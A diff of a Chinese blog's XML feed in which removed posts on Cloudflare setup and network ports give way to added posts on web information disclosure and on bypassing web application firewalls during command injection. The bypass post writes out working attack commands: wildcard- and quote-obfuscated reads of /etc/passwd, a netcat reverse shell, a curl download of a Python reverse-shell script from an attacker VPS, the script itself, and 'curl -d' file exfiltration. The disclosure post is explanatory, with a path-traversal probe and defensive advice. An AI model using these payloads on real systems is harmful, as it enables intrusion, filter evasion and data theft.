-<p>8、使用优选IP软件进行优选，2种方式，首先关闭WARP的连接。点击自动方式，自动的如果出错，就换手动的。手动方式1，打开操作。完成后打开根目录的输出文件，选择第一个延迟较低的ip地址和端口。再次打开手动方式2，右键粘贴刚刚的ip地址和端口。回车确认。WARP会自动连接。这就等于优选成功了！</p>
-<p><a href="https://imgse.com/i/pPez7IU"><img src="https://s1.ax1x.com/2023/08/10/pPez7IU.png" alt="pPez7IU.png"></a></p>
-]]></content>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>命令注入之Web应用防火墙绕过技巧</title>
+      <link href="/2023/07/22/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B9%8BWeb%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/"/>
+      <url>/2023/07/22/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B9%8BWeb%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>使用通配符绕过防火墙规则 例如使用 &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 来代替 cat &#x2F;etc&#x2F;passwd &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 其实匹配到的是 &#x2F;bash&#x2F;cat &#x2F;etc&#x2F;passwd</p><span id="more"></span><p>使用通配符绕过防火墙规则</p><p>例如使用 &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 来代替 cat &#x2F;etc&#x2F;passwd</p><p>&#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 其实匹配到的是 &#x2F;bash&#x2F;cat &#x2F;etc&#x2F;passwd</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-22.png" alt="图片"></p><p>有时候我们想用netcat在目标机器上反弹一个端口，那么可以如下操作：</p><p>&#x2F;???&#x2F;n? -e &#x2F;???&#x2F;b??h 127.0.0.1 6666</p><p># &#x2F;bin&#x2F;nc -e &#x2F;bin&#x2F;bash 127.0.0.1 6666</p><p># -e 后面跟上你要执行的程序，在连接成功后会自动运行该程序</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-23.png" alt="图片"></p><p>当然，你还可以使用*星号、[0-9]字符集等匹配符来获取相关信息，有关标准通配符的更多信息可以在终端中键入 命令 man 7 glob，按照手册进行学习。</p><p>使用字符串拼接绕过防火墙规则</p><p>连接字符串的操作符主要有以下几种</p><p>在python、Java中使用 + 号；在PHP、perl中使用 . 号；在lua语言中则使用 .. 符号来连接字符串。而这些编程语言中的一些字符串连接符，有时候在bash中也可以达到字符连接的效果，这就导致我们可以绕过一些Web应用防火墙规则(例如基于关键词匹配的防火墙规则)。</p><p>root@kali:~# echo Mochazz</p><p>Mochazz</p><p>root@kali:~# echo Mo”’chazz’</p><p>Mochazz</p><p>root@kali:~# echo ‘Mo”chazz’</p><p>Mochazz</p><p>root@kali:~# echo ‘M’och’az’z</p><p>Mochazz</p><p>看一条pm匹配规则（防火墙规则）</p><p># Detect suspicious client by looking at the user agent identification</p><p>SecRule REQUEST_HEADERS:User-Agent “@pm passwd shadow” “id:166″</p><p>这条规则将忽略大小写进行匹配，如果匹配中passwd或shadow词组，即进行阻断，但是如果我们使用字符串拼接，则可以绕过改规则</p><p>root@kali:~# &#x2F;’b’i”n&#x2F;’c”a’t &#x2F;e’t’c&#x2F;p”as”sw’d’</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-24.png" alt="图片"></p><p>使用以下命令在受害机上下载用于反弹shell的脚本</p><p>curl -v “<a href="http://vps的ip/shell.py%E2%80%9D">http://VPS的IP/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-25.png" alt="图片"></p><p>shell.py 代码如下</p><p>#!&#x2F;usr&#x2F;bin&#x2F;python</p><p>import socket,subprocess,os</p><p>s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</p><p>s.connect((“<my ip address>”,2375))</p><p>os.dup2(s.fileno(),0)</p><p>os.dup2(s.fileno(),1)</p><p>os.dup2(s.fileno(),2)</p><p>p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”])</p><p>提前在你的VPS上用nc侦听一个端口</p><p>nc -lvp [port]</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-26.png" alt="图片"></p><p>更进一步，我们可以将点分十进制的IP转换成长整数IP，例如</p><p>curl -v “<a href="http://127.0.0.1/shell.py%E2%80%9D">http://127.0.0.1/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p><p>curl -v “<a href="http://127.0.0.1/shell.py%E2%80%9D">http://2130706433/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p><p>使用 \ 符号来绕过WAF</p><p>root@kali:~# c\a\t &#x2F;etc&#x2F;passwd</p><p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</p><p>daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p><p>bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p><p>sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</p><p>sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</p><p>games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</p><p>使用 \ 符号加回车来绕过WAF</p><p>root@kali:~# c\</p><p>&gt; at &#x2F;e’t’c&#x2F;p”a’s’swd</p><p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</p><p>daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p><p>bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p><p>sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</p><p>sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</p><p>使用curl -d参数读取本地文件</p><p>curl -d @&#x2F;<file> <remote server></p><p>例如</p><p>curl -d @&#x2F;etc&#x2F;passwd 127.0.0.1:8888</p><p># 在本地侦听8888端口即可接受到数据</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-27.png" alt="图片"></p>]]></content>
+      
+      
       <categories>
-        <category>安全</category>
+          
+          <category> 安全 </category>
+          
       </categories>
-      <tags>
-        <tag>cloudflare</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>域名注册教学和cloudflare域名解析教程</title>
-    <url>/2023/07/21/%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E6%95%99%E5%AD%A6%E5%92%8Ccloudflare%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E6%95%99%E7%A8%8B/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>域名注册教学和cloudflare域名解析教程</p>
-<span id="more"></span>
-
-<p>视频教程: <a href="https://short.alone-hk.cn/6sugZ">https://short.alone-hk.cn/6sugZ</a></p>
-<p>cloudflare入口: <a href="https://cloudflare.com/">https://cloudflare.com</a></p>
-<p>godaddy入口: <a href="https://www.godaddy.com/">https://www.godaddy.com/</a></p>
-<p>首先注册一个域名添加到cloudflare并修改NS记录为cloudflare</p>
-<p>NS记录在注册商</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2023/01/image-1.png" alt="img">CF NS记录页面</p>
-<p>选用自定义DNS并改成cloudflare的记录</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2023/01/image-3.png" alt="img">NS注册商修改</p>
-<p>接下来配置DNS解析</p>
-<p>添加需要代理的地址选择A记录 名字填写需要代理的地址如www 填写服务器源ip</p>
-<p>将Proxied打开变为黄色代表成功 点击完成</p>
-<p>SSL证书获取</p>
-<p>点击SSL&#x2F;TLS — Origin Server — Create Certificate 创建证书</p>
-<p>如无特殊需要默认即可 默认会创建一个15年的证书 创建完成后要记得保存key 只出现一次(重要)! ! !</p>
-<p>将prm与key部署到服务器即可</p>
-<p>退回到Overview 选择Full (strict)</p>
-<p>到此恭喜你成功了!</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Web应用中的信息泄漏以及攻击方法</title>
+      <link href="/2023/07/22/Web%E5%BA%94%E7%94%A8%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/"/>
+      <url>/2023/07/22/Web%E5%BA%94%E7%94%A8%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Banner收集或主动侦察是一种攻击类型，攻击者在此期间向他们的目标系统发送请求，以收集有关它的更多信息。如果系统配置不当，可能会泄漏自己的信息，如服务器版本，PHP或者ASP.NET版本，OpenSSH版本等。</p><span id="more"></span><p><strong>Banner收集&#x2F;主动侦查</strong></p><p>Banner收集或主动侦察是一种攻击类型，攻击者在此期间向他们的目标系统发送请求，以收集有关它的更多信息。如果系统配置不当，可能会泄漏自己的信息，如服务器版本，PHP或者ASP.NET版本，OpenSSH版本等。</p><p>在大多数情况下，Banner收集并不会涉及关键信息泄漏，不过可以让攻击者收集到开发过程中使用环境版本的信息。例如：如果目标在服务器上面使用的是php旧版本，由于没有更新，所以攻击者可以利用已知的漏洞攻击，也许会出现远程命令执行&#x2F;代码执行的漏洞。</p><p>Banner信息收集举例：</p><p>Nmap scan report for example.com (x.x.x.x)</p><p>Host is up (0.037s latency).</p><p>Not shown: 999 filtered ports</p><p>PORT STATE SERVICE VERSION</p><p>22&#x2F;tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.3 (Ubuntu Linux; protocol 2.0)</p><p>Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p><p>在上面例子中，我们使用Nmap扫描器对目标进行端口扫描。结果表明目标开启了22端口，并且OpenSSH版本号是5.9p1。也许这个版本就存在可以被攻击者利用的漏洞。</p><p><strong>源码泄漏</strong></p><p>当Web应用程序的后端环境代码暴露给不涉及应用程序开发的用户时，会发生源代码泄露问题。源代码泄露使攻击者能够通过读取代码和检查逻辑缺陷，以及查看硬编码的用户名&#x2F;密码对或者API密钥来发现这个应用程序的不足以及漏洞。</p><p>漏洞的严重性取决于泄漏源码的多少，以及代码在应用程序中的重要性。总而言之，因为攻击者可以查看源代码，所以很大程度上将渗透测试由黑盒转向白盒。事实上，有很多错误能够导致源码泄漏的漏洞发生，下面这几种错误就包含在其中：</p><p><strong>代码库未受保护</strong></p><p>为了更加方便的管理站点，大多数站点都会把他们源码上传到云端。这些项目有时会管理不当，攻击者能够直接访问网站源码和网站信息。并且，有些公司将他们的开源软件项目放到了github上面，这样公共用户可以对这个项目作出改进。这种情况下，源码已经是公开的，但是这种情况下泄漏公司重要信息已经是很常见了。</p><p>实例：</p><p>有些源码库只允许使用第三方帐号进行登录并且符合身份认证的用户查看源码代码。这些源码库有时候配置错误，没有严格控制查看内容的权限，导致任何人都可以查看源码内容。</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-28.png" alt="图片"></p><p><strong>源代码中存在敏感信息</strong></p><p>另一个例子是当公共代码具有硬编码的敏感信息时，例如用户凭证或API密钥。攻击者可以轻松地使用这些信息来破坏这些服务，或者可以使用合法账户进行登录。在信息披露期间通常泄漏的另一条信息是内部IP地址，允许攻击者识别和了解内部网络拓扑，然后可以将这样的信息用于攻击内部服务中，例如服务器端请求伪造（SSRF）攻击来攻击多个系统。</p><p><strong>MIME类型不正确</strong></p><p>浏览器通过HTTP包头中的Content-Type内容来确定如何解析HTTP服务器响应返回的内容。举个例子，我们想让浏览器将html文件解析，而不是只是纯文本文件。再比如我们想让浏览器下载一个zip，而不是解析这个zip文件。</p><p>如果web服务器的配置错误，那么就会出现这样的错误：当我们访问html时候，Conten-Type会是:text&#x2F;plain,而不是text&#x2F;html，并且html文件会以纯文档的形式展现给浏览器。因此&lt;&#x2F;&gt;还有一些其他字符都会在页面上显示出来。下面图片是展示当页面访问时服务器设置的Content-Type响应头。</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-29.png" alt="图片"></p><p>当Web应用程序无法为其中包含源代码的网页发送适当的Content-Type头部时，可能会发生信息泄露问题，并且最终以纯文本形式呈现信息，并披露有关Web应用程序的有价值信息。</p><p><strong>实例</strong>：</p><p>我们假设一个Web服务器用于运行一个PHP</p><p>Web应用程序，但现在运行一个ASP.NET。以前由旧的Web应用程序使用并具有敏感信息（如MySQL数据库凭据）的PHP脚本正在被用户访问。如果PHP没有在Web服务器上运行和配置，则Content-Type将从HTTP响应中省略，并且PHP脚本将被解释为纯文本或HTML标记，具体取决于Web浏览器，然后就会泄露里面包含的所有信息。</p><p>下面屏幕截图就展示了即使服务器返回头没有设置Content-Type，火狐浏览器还是将php脚本解析成了HTML。我们需要在查看源代码中看到脚本信息。</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-30.png" alt="图片"></p><p>下面截图展示了chrome浏览器直接返回了纯文本的文件，所以我们可以直接看到源码。</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-31.png" alt="图片"></p><p><strong>处理敏感信息不当</strong></p><p>另一种常见的信息泄漏是由硬编码的账户名和密码以及内部ip在代码的注释中泄漏。在大多数情况下，这些敏感信息在访问web页面时会展现出来。这些敏感信息的泄漏也可能会导致web应用程序遭受攻击。攻击者只需要右键页面查看网页源代码，就可以找到这些注释。如果在发现web应用程序存在这种问题，Netsparker将会提醒您。</p><p><strong>缺少认证机制或者认证机制配置不当</strong></p><p>在Web应用程序权限设置不正确，不完整或甚至缺少授权检查可能会允许攻击者访问敏感信息或未授权访问登录用户的信息。这些问题很常见，它们也列在OWASP十大最常见和利用漏洞的列表中。</p><p>示例：<a href="https://www.netsparker.com/blog/web-security/missing-function-level-access-control-vulnerability-maian-support-helpdesk/">https://www.netsparker.com/blog/web-security/missing-function-level-access-control-vulnerability-maian-support-helpdesk/</a></p><p>一个真实的权限控制不当，导致被拿shell的案例。</p><p><strong>文件名或者文件路径泄漏</strong></p><p>在某些情况下，Web应用程序可以公开文件名或文件路径，从而显示关于底层系统结构的信息。这可能是由于用户输入的不正确处理，后端的异常或Web服务器的不当配置。有时可以在Web应用程序，错误页面，调试信息等的响应中找到或标识这些信息。</p><p>示例：</p><p>攻击者可以通过发送访问请求来检查Web应用程序是否公开任何文件名或路径。例如，当发送以下请求时，Web应用程序返回403（禁止）响应：</p><p><a href="https://www.example.com/etc/passwd">https://www.example.com/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd</a></p><p>但是当攻击者发送下面请求时，web应用程序返回404（没有文件）的响应：</p><p><a href="https://www.example.com/etc/doesntexist">https://www.example.com/%5C../%5C../%5C../%5C../%5C../%5C../etc/doesntexist</a></p><p>由于第一次请求，攻击者得到了403 Forbidden错误，而对于第二个请求，他得到了404 Not Found，他知道在第一种情况下，该文件存在。因此，攻击者可以利用Web应用程序的行为，了解服务器的结构以及验证系统上是否存在某个文件夹或文件。</p><p><strong>目录遍历</strong></p><p>文件名和路径公开相关的是Web服务器中的目录显示功能。此功能在Web服务器上默认提供。当没有默认网页时，在网站上显示Web服务器显示用户列表中的文件和目录。</p><p>因此，在apahce服务器上面默认文件名为Index.php，当没有上传index.php时，服务器就会将文件夹中的内容全部展示出来。如下图：</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-32.png" alt="图片"></p><p>使用这样一个模块会使服务器产生很大的安全隐患。</p><p>实例：</p><p>现在很多人都知道这样的功能应该被禁用，所以看到它并不常见。虽然我们假设扫描Web服务器的端口后，攻击者发现在8081端口运行的Web服务器的默认启动此功能。</p><p>这样的“默认值”通常被Web服务器管理员忽略，这也意味着它们不太安全。它会允许攻击者浏览目录并访问Web应用程序的源代码，备份和可能的数据库文件。</p><p><strong>防止信息泄漏应该注意的事项</strong></p><p>信息泄漏问题似乎是一件小事情，但对攻击者来说是非常有价值的。它们允许攻击者通过执行基本测试，有时只需在公共页面中查找信息，获得有关攻击目标的非常有用的信息。</p><p>事实上，Netsparker在扫描目标网站时会报告知识库节点中可能的信息披露和其他类似的安全问题。你应该解决这些问题，特别是当你认为它们很容易修复时。以下是遵循的一些指导方针，以便您可以确保您的Web应用程序受到良好保护：</p><ol><li>确保您的Web服务器不发送显示有关后端技术类型或版本信息的响应头。</li><li>确保服务器打开的端口上运行的所有服务都不会显示有关其构建和版本的信息。</li><li>确保所有目录的访问权限正确，保证不会让攻击者访问到你的所有文件。</li><li>不要在代码中将账户密码硬编码进去。也不要在注释中写入相关信息。</li><li>在web服务器中为所有类型的应用程序配置MIME信息</li><li>不需要上传到网站上的敏感信息永远都不要上传</li><li>始终检查每个创建&#x2F;编辑&#x2F;查看&#x2F;删除资源的请求是否具有适当的访问控制，防止越权访问，并确保所有机密信息保密。</li><li>确保您的Web应用程序正确处理用户输入，并且始终为所有不存在&#x2F;不允许的资源返回通用响应，以便混淆攻击者。</li><li>后端代码应该考虑到所有情况，并且当异常发生时，能够保证信息不被泄漏。</li><li>配置Web服务器以禁止目录遍历，并确保Web应用程序始终显示默认网页。</li></ol>]]></content>
+      
+      
       <categories>
-        <category>安全</category>
+          
+          <category> 安全 </category>
+          
       </categories>
-      <tags>
-        <tag>cloudflare</tag>
-        <tag>免费cdn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>各网络端口介绍</title>
-    <url>/2023/07/22/%E5%90%84%E7%BD%91%E7%BB%9C%E7%AB%AF%E5%8F%A3%E4%BB%8B%E7%BB%8D/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>网络端口，TCP&#x2F;IP协议 中的端口， 端口号的范围从0到65535，比如用于浏览网页服务的80端口，用于FTP服务的21端口等等</p>
-<span id="more"></span>
-
-<p>2端口：管理实用程序</p>
-<p>3端口：压缩进程</p>
-<p>5端口：远程作业登录</p>
-<p>7端口：回显</p>
-<p>9端口：丢弃</p>
-<p>11端口：在线用户</p>
-<p>13端口：时间</p>
-<p>17端口：每日引用</p>
-<p>18端口：消息发送协议</p>
-<p>19端口：字符发生器</p>
-<p>20端口：FTP文件传输协议(默认数据口)</p>
-<p>21端口：FTP文件传输协议(控制)</p>
-<p>22端口：SSH远程登录协议</p>
-<p>23端口：telnet(终端仿真协议),木马Tiny Telnet Server开放此端口</p>
-<p>24端口：预留给个人用邮件系统</p>
-<p>25端口：SMTP服务器所开放的端口，用于发送邮件</p>
-<p>27端口：NSW 用户系统 FE</p>
-<p>29端口：MSG ICP</p>
-<p>31端口：MSG验证,木马Master Paradise、HackersParadise开放此端口</p>
-<p>33端口：显示支持协议</p>
-<p>35端口：预留给个人打印机服务</p>
-<p>37端口：时间</p>
-<p>38端口：路由访问协议</p>
-<p>39端口：资源定位协议</p>
-<p>41端口：图形</p>
-<p>42端口：主机名服务</p>
-<p>43端口：who is服务</p>
-<p>44端口：MPM(消息处理模块)标志协议</p>
-<p>45端口：消息处理模块</p>
-<p>46端口：消息处理模块(默认发送口)</p>
-<p>47端口：NI FTP</p>
-<p>48端口：数码音频后台服务</p>
-<p>49端口：TACACS登录主机协议</p>
-<p>50端口：远程邮件检查协议</p>
-<p>51端口：IMP(接口信息处理机)逻辑地址维护</p>
-<p>52端口：施乐网络服务系统时间协议</p>
-<p>53端口：dns域名服务器</p>
-<p>54端口：施乐网络服务系统票据交换</p>
-<p>55端口：ISI图形语言</p>
-<p>56端口：施乐网络服务系统验证</p>
-<p>57端口：预留个人用终端访问</p>
-<p>58端口：施乐网络服务系统邮件</p>
-<p>59端口：预留个人文件服务</p>
-<p>60端口：未定义</p>
-<p>61端口：NI邮件</p>
-<p>62端口：异步通讯适配器服务</p>
-<p>63端口：whois++</p>
-<p>64端口：通讯接口</p>
-<p>65端口：TACACS数据库服务</p>
-<p>66端口：Oracle SQL*NET</p>
-<p>67端口：引导程序协议服务端</p>
-<p>68端口：引导程序协议客户端</p>
-<p>69端口：小型文件传输协议</p>
-<p>70端口：信息检索协议</p>
-<p>71端口：远程作业服务</p>
-<p>72端口：远程作业服务</p>
-<p>73端口：远程作业服务</p>
-<p>74端口：远程作业服务</p>
-<p>75端口：预留给个人拨出服务</p>
-<p>76端口：分布式外部对象存储</p>
-<p>77端口：预留给个人远程作业输入服务</p>
-<p>78端口：修正TCP</p>
-<p>79端口：查询远程主机在线用户等信息</p>
-<p>80端口：http,用于网页浏览,木马Executor开放此端口</p>
-<p>81端口：HOST2名称服务</p>
-<p>82端口：传输实用程序</p>
-<p>83端口：模块化智能终端ML设备</p>
-<p>84端口：公用追踪设备</p>
-<p>85端口：模块化智能终端ML设备</p>
-<p>86端口：Micro Focus Cobol编程语言</p>
-<p>87端口：预留给个人终端连接</p>
-<p>88端口：Kerberros安全认证系统</p>
-<p>89端口：SU&#x2F;MIT telnet(终端仿真网关)</p>
-<p>90端口：DNSIX 安全属性标记图</p>
-<p>91端口：MIT Dover假脱机</p>
-<p>92端口：网络打印协议</p>
-<p>93端口：设备控制协议</p>
-<p>94端口：Tivoli对象调度</p>
-<p>96端口：DIXIE协议规范</p>
-<p>97端口：快速远程虚拟文件协议</p>
-<p>98端口：TAC新闻协议</p>
-<p>99端口：后门程序ncx99开放此端口</p>
-<p>100端口：未知用途</p>
-<p>101端口：NIC 主机名称服务</p>
-<p>102端口：消息传输代理</p>
-<p>103端口：Genesis 点对点传输网络</p>
-<p>105端口：信箱名称服务</p>
-<p>106端口：3COM-TSMUX开放端口</p>
-<p>107端口：远程Telnet服务</p>
-<p>108端口：SNA 网关访问服务</p>
-<p>109端口：POP2服务器开放此端口,用于接收邮件</p>
-<p>110端口：POP3服务器开放此端口,用于接收邮件</p>
-<p>111端口：SUN公司的RPC服务所有端口</p>
-<p>112端口：McIDAS 数据传输协议</p>
-<p>113端口：认证服务，用于鉴别TCP连接的用户</p>
-<p>114端口：音频新闻多点服务</p>
-<p>115端口：简单文件传输服务</p>
-<p>116端口：ANSA REX 通知</p>
-<p>117端口：UUCP 路径服务</p>
-<p>118端口：SQL 服务</p>
-<p>119端口：NEWS新闻组传输协议，承载USENET通信</p>
-<p>121端口：木马BO jammerkillahV开放端口</p>
-<p>122端口：SMAKY网络</p>
-<p>123端口：网络时间协议，蠕虫病毒会利用，一般关闭</p>
-<p>128端口：GSS X许可认证</p>
-<p>129端口：密码生成器协议</p>
-<p>130端口：Cisco软件开放端口</p>
-<p>131端口：Cisco软件开放端口</p>
-<p>132端口：Cisco软件开放端口</p>
-<p>133端口：统计服务</p>
-<p>134端口：INGRES-网络服务</p>
-<p>135端口：DCOM服务，冲击波病毒利用，不能关闭</p>
-<p>136端口：命名系统</p>
-<p>137端口：NETBIOS协议应用，为共享开放</p>
-<p>138端口：NETBIOS协议应用，为共享开放</p>
-<p>139端口：NETBIOS协议应用，为共享开放</p>
-<p>140端口：EMFIS数据服务</p>
-<p>141端口：EMFIS控制服务</p>
-<p>143端口：Interim邮件访问协议</p>
-<p>144端口：UMA软件开放端口</p>
-<p>145端口：UAAC协议</p>
-<p>149端口：AED 512仿真服务</p>
-<p>150端口：SQL(结构化查询语言)-网络</p>
-<p>152端口：后台文件传输协议</p>
-<p>156端口：SQL(结构化查询语言)服务</p>
-<p>158端口：PC邮件服务器</p>
-<p>159端口：NSS-路由</p>
-<p>160端口：SGMP-陷阱</p>
-<p>161端口：简单网络管理协议</p>
-<p>162端口：SNMP陷阱</p>
-<p>163端口：CMIP&#x2F;TCP 管理</p>
-<p>164端口：CMIP&#x2F;TCP 代理</p>
-<p>166端口：Sirius系统</p>
-<p>169端口：发送</p>
-<p>170端口：网络附言</p>
-<p>177端口：x显示管理控制协议，入侵者通过它访问X-windows操作台</p>
-<p>178端口：NextStep Window 服务</p>
-<p>179端口：边界网关协议</p>
-<p>180端口：图表</p>
-<p>181端口：统一</p>
-<p>184端口：OC服务器</p>
-<p>185端口：远程-KIS</p>
-<p>186端口：KIS 协议</p>
-<p>187端口：应用通信接口</p>
-<p>189端口：队列文件传输</p>
-<p>190端口：网关进入控制协议</p>
-<p>191端口：Prospero 目录服务</p>
-<p>192端口：OSU 网络监视系统</p>
-<p>193端口：Spider 远程控制协议</p>
-<p>194端口：多线交谈协议</p>
-<p>197端口：目录地址服务</p>
-<p>198端口：目录地址服务监视器</p>
-<p>200端口：IBM系统资源控制器</p>
-<p>201端口：AppleTalk(Mac机所用的网络协议)路由保证</p>
-<p>202端口：AppleTalk(Mac机所用的网络协议)Name Binding</p>
-<p>203端口：AppleTalk(Mac机所用的网络协议)未用端口</p>
-<p>204端口：AppleTalk(Mac机所用的网络协议)回显</p>
-<p>205端口：AppleTalk(Mac机所用的网络协议)未用端口</p>
-<p>206端口：AppleTalk(Mac机所用的网络协议)区信息</p>
-<p>207端口：AppleTalk(Mac机所用的网络协议)未用端口</p>
-<p>208端口：AppleTalk(Mac机所用的网络协议)未用端口</p>
-<p>209端口：快速邮件传输协议</p>
-<p>210端口：ANSI(美国国家标准协会)Z39.50</p>
-<p>211端口：Texas Instruments 914C&#x2F;G终端</p>
-<p>213端口：IPX(以太网所用的协议)</p>
-<p>218端口：Netix消息记录协议</p>
-<p>219端口：Unisys ARPs</p>
-<p>220端口：交互邮件访问协议 v3</p>
-<p>223端口：证书分发中心</p>
-<p>224端口：masq拨号器</p>
-<p>241端口：预留端口 (224-241)</p>
-<p>245端口：链接</p>
-<p>246端口：显示系统协议</p>
-<p>257端口：安全电子交易系统</p>
-<p>258端口：Yak Winsock 个人聊天</p>
-<p>259端口：有效短程遥控</p>
-<p>260端口：开放端口</p>
-<p>261端口：IIOP 基于TLS&#x2F;SSL的命名服务</p>
-<p>266端口：SCSI(小型计算机系统接口)on ST</p>
-<p>267端口：Tobit David服务层</p>
-<p>268端口：Tobit David复制</p>
-<p>281端口：个人连结</p>
-<p>282端口：Cable端口A&#x2F;X</p>
-<p>286端口：FXP通信</p>
-<p>308端口：Novastor备份</p>
-<p>313端口：Magenta逻辑</p>
-<p>318端口：PKIX时间标记</p>
-<p>333端口：Texar安全端口</p>
-<p>344端口：Prospero数据存取协议</p>
-<p>345端口：Perf分析工作台</p>
-<p>346端口：Zebra服务器</p>
-<p>347端口：Fatmen服务器</p>
-<p>348端口：Cabletron管理协议</p>
-<p>358端口：Shrink可上网家电协议</p>
-<p>359端口：网络安全风险管理协议</p>
-<p>362端口：SRS发送</p>
-<p>363端口：RSVP隧道</p>
-<p>372端口：列表处理</p>
-<p>373端口：Legend公司</p>
-<p>374端口：Legend公司</p>
-<p>376端口：AmigaEnvoy网络查询协议</p>
-<p>377端口：NEC公司</p>
-<p>378端口：NEC公司</p>
-<p>379端口：TIA&#x2F;EIA&#x2F;IS-99调制解调器客户端</p>
-<p>380端口：TIA&#x2F;EIA&#x2F;IS-99调制解调器服务器</p>
-<p>381端口：hp(惠普)性能数据收集器</p>
-<p>382端口：hp(惠普)性能数据控制节点</p>
-<p>383端口：hp(惠普)性能数据警报管理</p>
-<p>384端口：远程网络服务器系统</p>
-<p>385端口：IBM应用程序</p>
-<p>386端口：ASA信息路由器定义文件.</p>
-<p>387端口：Appletalk更新路由.</p>
-<p>389端口：轻型目录访问协议</p>
-<p>395端口：网络监视控制协议</p>
-<p>396端口：Novell(美国Novell公司)Netware(Novell公司出的网络操作系统)over IP</p>
-<p>400端口：工作站解决方案</p>
-<p>401端口：持续电源</p>
-<p>402端口：Genie协议</p>
-<p>406端口：交互式邮件支持协议</p>
-<p>408端口：Prospero资源管理程序</p>
-<p>409端口：Prospero资源节点管理.</p>
-<p>410端口：DEC(数据设备公司)远程调试协议</p>
-<p>411端口：远程MT协议</p>
-<p>412端口：陷阱协定端口</p>
-<p>413端口：存储管理服务协议</p>
-<p>414端口：信息查询</p>
-<p>415端口：B网络</p>
-<p>423端口：IBM操作计划和控制开端</p>
-<p>424端口：IBM操作计划和控制追踪</p>
-<p>425端口：智能计算机辅助设计</p>
-<p>427端口：服务起位置</p>
-<p>434端口：移动ip代理</p>
-<p>435端口：移动ip管理</p>
-<p>443端口：基于TLS&#x2F;SSL的网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP</p>
-<p>444端口：简单网络内存分页协议</p>
-<p>445端口：Microsoft-DS，为共享开放，震荡波病毒利用，一般应关闭</p>
